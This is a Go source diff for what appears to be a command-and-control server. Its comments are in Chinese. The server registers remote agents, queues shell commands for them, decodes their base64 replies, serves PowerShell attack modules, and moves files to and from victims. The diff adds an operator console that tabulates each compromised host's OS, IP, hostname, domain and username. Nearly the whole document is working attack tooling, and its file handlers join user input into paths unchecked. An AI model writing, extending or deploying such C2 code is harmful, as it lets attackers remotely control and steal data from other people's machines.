@@ -4,22 +4,35 @@ import (
 	"bufio"
 	"encoding/base64"
 	"fmt"
+	"io/ioutil"
+	"math/rand"
 	"net/http"
 	"os"
+	"os/exec"
 	"regexp"
-	"io/ioutil"
-	"github.com/axgle/mahonia"
+	"runtime"
+	"strings"
 	"time"
-	"math/rand"
+
+	"github.com/axgle/mahonia"          //中文编码
+	"github.com/olekukonko/tablewriter" //表格
 )
+
+const help = `
+		help   帮助参数
+   		info   列出操作系统参数
+		exit   退出
+	 `
 
 var (
-	cmd    string = ""
-	AGENTS map[string]string
+	OS, Arch, IP, hostname, domain, username string //  func info_os()  表格变量
+	cmd                                      string = ""
+	AGENTS                                   map[string]string
+	info                                     string = ""
+	//全局变量
 )
 
-
-func  GetRandomString(l int) string {
+func GetRandomString(l int) string {
 	str := "0123456789abcdefghijklmnopqrstuvwxyz"
 	bytes := []byte(str)
 	result := []byte{}
@@ -44,13 +57,13 @@ func sayhelloName(w http.ResponseWriter, r *http.Request) {
 	//info
 	if url_info.MatchString(r.URL.Path) {
 		data := mahonia.NewDecoder("gbk").ConvertString(string(r.Form.Get("data")))
-		fmt.Println("Form", data)
+		info = data
 		AGENTS = make(map[string]string)
 		url_path, _ := regexp.Compile(`[A-Z]+`)
 		id := url_path.FindString(r.URL.Path)
 		AGENTS[id] = "ok"
 
-	//md执行命令
+		//md执行命令
 	} else if url_cm.MatchString(r.URL.Path) {
 		url_path, _ := regexp.Compile(`[A-Z]+`)
 		var id = url_path.FindString(r.URL.Path)
@@ -68,7 +81,7 @@ func sayhelloName(w http.ResponseWriter, r *http.Request) {
 
 		}
 
-	//re接收返回信息
+		//re接收返回信息
 	} else if url_re.MatchString(r.URL.Path) {
 		web_data := r.Form.Get("data")
 		decoded, _ := base64.StdEncoding.DecodeString(web_data)
@@ -76,33 +89,33 @@ func sayhelloName(w http.ResponseWriter, r *http.Request) {
 		fmt.Println("\n")
 		fmt.Println(decodestr)
 
-	//load加载ps模块
+		//load加载ps模块
 	} else if url_md.MatchString(r.URL.Path) {
 		web_data := r.Form.Get("data")
-		file_data, err := ioutil.ReadFile("./Modules/"+web_data)
-    if err != nil {
-        fmt.Println("Error reading module file", err)
-        fmt.Fprintf(w, "")
-        return
-    }else{
-    	fmt.Fprintf(w,string(file_data))
-    }
-		
-	//up客户端下载文件
-	} else if url_up.MatchString(r.URL.Path){
-		web_data := r.Form.Get("data")
-		file_data, err := ioutil.ReadFile("./file/"+web_data)
+		file_data, err := ioutil.ReadFile("./Modules/" + web_data)
 		if err != nil {
-        fmt.Println("Read file error", err)
-        fmt.Fprintf(w, "")
-        return
-    }else{
-    	encodeString := base64.StdEncoding.EncodeToString(file_data)
-    	fmt.Fprintf(w,(encodeString))
-    }
-	
-	//img上传文件到服务端
-	} else if url_img.MatchString(r.URL.Path){
+			fmt.Println("Error reading module file", err)
+			fmt.Fprintf(w, "")
+			return
+		} else {
+			fmt.Fprintf(w, string(file_data))
+		}
+
+		//up客户端下载文件
+	} else if url_up.MatchString(r.URL.Path) {
+		web_data := r.Form.Get("data")
+		file_data, err := ioutil.ReadFile("./file/" + web_data)
+		if err != nil {
+			fmt.Println("Read file error", err)
+			fmt.Fprintf(w, "")
+			return
+		} else {
+			encodeString := base64.StdEncoding.EncodeToString(file_data)
+			fmt.Fprintf(w, (encodeString))
+		}
+
+		//img上传文件到服务端
+	} else if url_img.MatchString(r.URL.Path) {
 		//bug
 		//1.http里+会转义为空格
 		//2.post上传有限制比较小
@@ -110,13 +123,13 @@ func sayhelloName(w http.ResponseWriter, r *http.Request) {
 		web_data := r.Form.Get("data")
 		//decoded, _ := base64.StdEncoding.DecodeString(web_data)
 		//decodestr := string(decoded)
-		
-		file, _ := os.Create("./upload/"+GetRandomString(5))
-    file.WriteString(web_data)
-    file.Close()
-    fmt.Fprintf(w,("ok upload"))
-    
-	}	else {
+
+		file, _ := os.Create("./upload/" + GetRandomString(5))
+		file.WriteString(web_data)
+		file.Close()
+		fmt.Fprintf(w, ("ok upload"))
+
+	} else {
 		//全都不匹配输出请求详细
 		//应增加ua头判断
 		//先强制断开连接
@@ -193,20 +206,78 @@ func sayhelloName(w http.ResponseWriter, r *http.Request) {
 //    return err
 //
 //}
+func info_os() { //定义表格  info信息
+	info := strings.Split(info, "**")
+	OS = info[0]
+	IP = info[1]
+	Arch = info[2]
+	hostname = info[3]
+	domain = info[4]
+	username = info[5]
+	//定义 info 信息中的变量
+	data := [][]string{
+		[]string{OS, IP, Arch, hostname, domain, username},
+	}
+	//将info信息做成表格
+	table := tablewriter.NewWriter(os.Stdout)
+	table.SetHeader([]string{"操作系统版本", "IP地址", "x86 OR x64", "主机名", "域名", "用户名"})
+
+	for _, v := range data {
+		table.Append(v)
+	}
+	table.Render() // Send output
+} //定义表格  info信息
 
 func Scanf(a *string) {
 	reader := bufio.NewReader(os.Stdin)
 	data, _, _ := reader.ReadLine()
+	if string(data) == "info" {
+		*a = ""
+		info_os() // info信息
+		return
+	} else if string(data) == "help" {
+		*a = ""
+
+		fmt.Println(help)
+		return
+		//帮助参数
+	} else if string(data) == "exit" {
+		*a = ""
+		os.Exit(0)
+		return
+		//系统退出
+	} else {
+		fmt.Println(help)
+	}
 	*a = string(data)
+
 }
+
+func clear() {
+	if runtime.GOOS == "windows" {
+		cmd := exec.Command("cmd", "/c", "cls")
+		cmd.Stdout = os.Stdout
+		cmd.Run()
+		cmd.Start()
+	} else {
+		cmd := exec.Command("clear")
+		cmd.Stdout = os.Stdout
+		cmd.Run()
+		cmd.Start()
+	}
+	//定义系统清屏clear()
+}
+
 func main() {
 	http.HandleFunc("/", sayhelloName) //设置访问的路由
 
 	go http.ListenAndServe(":9090", nil) //设置监听的端口
+	clear()                              //系统清屏
 	for true {
 
 		fmt.Print("Console_shell >")
 		Scanf(&cmd)
+
 	}
 
 }
